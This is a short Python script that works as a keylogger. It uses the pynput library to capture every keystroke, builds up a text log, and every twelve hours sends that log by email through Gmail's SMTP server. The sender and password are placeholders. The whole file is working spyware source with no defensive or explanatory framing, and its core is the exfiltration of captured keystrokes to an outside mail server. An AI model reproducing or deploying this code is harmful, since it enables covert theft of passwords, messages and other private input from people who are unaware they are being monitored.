#!usr/bin/env python
from pynput import keyboard
import threading
import smtplib

log = ""   #variable to contain the key-presses
def on_press(key):
    global log
    #error handling
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.backspace:
            log = log[:-1]
        elif key == key.space:
            log = log + " "
        elif key == key.shift or key == key.shift_r or key == key.ctrl_l or key == key.ctrl_r or key == key.left or key == key.right or key == key.up or key == key.down:
            log = log
        else:
            log = log + " " + str(key) + " "
    #print(log)

def report():
    global log
    #print(log)
    mail()
    timer = threading.Timer(43200, report)
    timer.start()

def mail():
    global log
    email = "example@gmail.com"
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email, "passkey")
    message = log
    s.sendmail(email, email, message)
    s.quit()


#listener to monitor the keyboard keys
with keyboard.Listener(on_press=on_press) as listener:
    report()
    listener.join()
